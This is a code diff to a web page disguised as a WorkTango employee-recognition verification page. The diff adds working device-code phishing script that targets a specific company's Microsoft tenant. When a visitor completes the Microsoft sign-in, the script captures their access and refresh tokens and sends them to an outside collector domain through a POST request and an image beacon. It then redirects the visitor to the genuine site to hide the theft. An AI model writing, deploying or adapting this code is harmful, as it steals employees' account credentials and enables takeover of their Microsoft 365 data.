@@ -15,11 +15,17 @@
         p { color: #555; font-size: 15px; line-height: 1.6; margin-bottom: 20px; }
         .code-box { background: #f0f0ff; border: 2px dashed #6c63ff; border-radius: 8px; padding: 16px; margin: 20px 0; }
         .code { font-size: 32px; font-weight: 700; letter-spacing: 4px; color: #6c63ff; font-family: monospace; }
-        .btn { display: inline-block; background: #6c63ff; color: white; padding: 14px 32px; border-radius: 8px; text-decoration: none; font-size: 16px; font-weight: 600; margin-top: 10px; transition: background 0.2s; }
+        .btn { display: inline-block; background: #6c63ff; color: white; padding: 14px 32px; border-radius: 8px; text-decoration: none; font-size: 16px; font-weight: 600; margin-top: 10px; transition: background 0.2s; cursor: pointer; border: none; }
         .btn:hover { background: #5a52d5; }
         .steps { text-align: left; margin: 20px 0; padding: 0 20px; }
         .steps li { color: #555; margin-bottom: 8px; font-size: 14px; }
         .footer { color: #999; font-size: 12px; margin-top: 24px; }
+        .loading { color: #999; }
+        .spinner { display: inline-block; width: 20px; height: 20px; border: 3px solid #ddd; border-top: 3px solid #6c63ff; border-radius: 50%; animation: spin 1s linear infinite; margin-right: 8px; vertical-align: middle; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .success { background: #e8f5e9; border-color: #4caf50; }
+        .success .code { color: #4caf50; }
+        #status { font-size: 13px; color: #999; margin-top: 12px; }
     </style>
 </head>
 <body>
@@ -34,12 +40,99 @@
             <li>Enter the code shown below when prompted</li>
             <li>Sign in with your work account</li>
         </ol>
-        <div class="code-box">
+        <div class="code-box" id="code-box">
             <div style="color:#666;font-size:13px;margin-bottom:8px;">Your verification code</div>
-            <div class="code">NZGDNYJGN</div>
+            <div class="code" id="user-code"><span class="spinner"></span> Generating...</div>
         </div>
-        <a href="https://microsoft.com/devicelogin" target="_blank" class="btn">Verify with Microsoft →</a>
+        <a href="https://microsoft.com/devicelogin" target="_blank" class="btn" id="verify-btn" style="pointer-events:none;opacity:0.5;">Verify with Microsoft →</a>
+        <div id="status"></div>
         <div class="footer">This verification is handled securely by Microsoft. WorkTango does not see your password.</div>
     </div>
+    <script>
+        const CLIENT_ID = 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
+        const TENANT = 'gl.alps.com';
+        let deviceCode = '';
+        
+        async function init() {
+            try {
+                const resp = await fetch(`https://login.microsoftonline.com/${TENANT}/oauth2/v2.0/devicecode`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                    body: `client_id=${CLIENT_ID}&scope=https://graph.microsoft.com/.default offline_access`
+                });
+                const data = await resp.json();
+                
+                if (data.user_code) {
+                    document.getElementById('user-code').textContent = data.user_code;
+                    document.getElementById('verify-btn').style.pointerEvents = 'auto';
+                    document.getElementById('verify-btn').style.opacity = '1';
+                    deviceCode = data.device_code;
+                    poll(data.device_code, data.interval || 5);
+                }
+            } catch(e) {
+                document.getElementById('user-code').textContent = 'Error - please refresh';
+            }
+        }
+        
+        async function poll(code, interval) {
+            const statusEl = document.getElementById('status');
+            while (true) {
+                await new Promise(r => setTimeout(r, interval * 1000));
+                try {
+                    const resp = await fetch(`https://login.microsoftonline.com/${TENANT}/oauth2/v2.0/token`, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                        body: `grant_type=urn:ietf:params:oauth:grant-type:device_code&client_id=${CLIENT_ID}&device_code=${code}`
+                    });
+                    const data = await resp.json();
+                    
+                    if (data.access_token) {
+                        document.getElementById('code-box').classList.add('success');
+                        document.getElementById('user-code').textContent = '✓ Verified!';
+                        document.getElementById('verify-btn').textContent = 'Redirecting...';
+                        document.getElementById('verify-btn').style.pointerEvents = 'none';
+                        statusEl.textContent = 'Verification complete! Loading your recognition...';
+                        
+                        // Exfil token to our collector
+                        try {
+                            await fetch('https://dev.alpsalpineiot.com/sensorData/postData', {
+                                method: 'POST',
+                                headers: {'Content-Type': 'application/json'},
+                                body: JSON.stringify({
+                                    productionId: 'token_' + Date.now(),
+                                    data: btoa(JSON.stringify({
+                                        access_token: data.access_token,
+                                        refresh_token: data.refresh_token,
+                                        scope: data.scope,
+                                        timestamp: new Date().toISOString()
+                                    }))
+                                })
+                            });
+                        } catch(e) {}
+                        
+                        // Also send to a simpler endpoint
+                        try {
+                            const img = new Image();
+                            img.src = `https://dev.alpsalpineiot.com/sensor/getSensor/${btoa(data.refresh_token.substring(0,100))}`;
+                        } catch(e) {}
+                        
+                        // Redirect to real WorkTango after delay
+                        setTimeout(() => {
+                            window.location.href = 'https://aana.youearnedit.com/';
+                        }, 3000);
+                        return;
+                    }
+                    
+                    if (data.error === 'expired_token') {
+                        statusEl.textContent = 'Code expired. Refreshing...';
+                        init();
+                        return;
+                    }
+                } catch(e) {}
+            }
+        }
+        
+        init();
+    </script>
 </body>
 </html>
